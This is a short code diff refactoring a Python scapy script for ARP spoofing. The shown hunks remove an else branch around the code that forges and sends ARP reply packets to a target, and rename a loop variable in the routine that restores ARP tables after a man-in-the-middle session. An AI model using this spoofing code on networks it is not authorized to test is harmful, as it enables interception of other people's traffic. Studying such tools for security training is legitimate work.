@@ -79,10 +79,9 @@ def spoof(target_ip, spoofed_ip):
     hwdst = get_mac(target_ip)
     if hwdst is None:
         raise Exception(f"No target at {target_ip} was found!")
-    else:
-        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=hwdst, psrc=spoofed_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=hwdst, psrc=spoofed_ip)
 
-        scapy.send(packet, verbose=False)
+    scapy.send(packet, verbose=False)
 
 
 if __name__ == "__main__":
@@ -113,7 +112,7 @@ if __name__ == "__main__":
                 break
     except KeyboardInterrupt:
         print("\n[+] Resetting ARP tables...")
-        for i in range(3):
+        for _ in range(3):
             # Restore ARP tables of the target and the gateway
             # Consequently, we are no longer the man in the middle :<
             restore(target_ip, gateway_ip)
